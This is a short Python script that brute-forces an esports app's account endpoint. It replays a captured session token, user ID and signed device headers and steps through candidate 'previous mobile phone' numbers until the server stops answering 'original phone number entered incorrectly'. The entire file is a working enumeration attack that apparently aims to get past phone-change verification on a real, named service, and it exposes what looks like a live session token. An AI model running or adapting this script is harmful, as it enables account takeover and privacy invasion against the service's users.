import requests
import json

url = "https://passport.pwesports.cn/account/checkPhone"

params = {
  'appId': "2",
  'previousMobilePhone': "19200008753",
  'token': "e42ca01ad5c508404018f48f68226f77b110124b",
  'userId': "1015835929"
}

headers = {
  'User-Agent': "esport-app/3.5.5 (com.wmzq.esportapp; build:1; iOS 17.6.1) Alamofire/5.9.1",
  'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
  'tdSign': "i7b3d107b2972afe6e5a61ee73f9a8afd00000000000000000000000000000000d186c340cf101c6c49961f290fb91ba0bf0875d046a9172af3800760000000000001101f9580bb87c8dc6a51b7925446f0a5191",
  'appversion': "3.5.5",
  'gameTypeStr': "1,2",
  'Accept-Language': "zh-Hans-CN;q=1.0",
  'platform': "ios",
  'token': "e42ca01ad5c508404018f48f68226f77b110124b",
  't': "1740058609",
  'Content-Type': "application/json",
  'gameType': "1,2",
  'device': "qIPSA1740058584lfcIKhW2eZ9"
}

while True:
    response = requests.get(url, params=params, headers=headers)
    data = json.loads(response.text)
    print(f"previousMobilePhone: {params['previousMobilePhone']}, description: {data.get('description')}")
    if data.get('description') != "原手机号输入错误":
        break
    previous_mobile_phone = int(params['previousMobilePhone']) + 10000
    params['previousMobilePhone'] = str(previous_mobile_phone)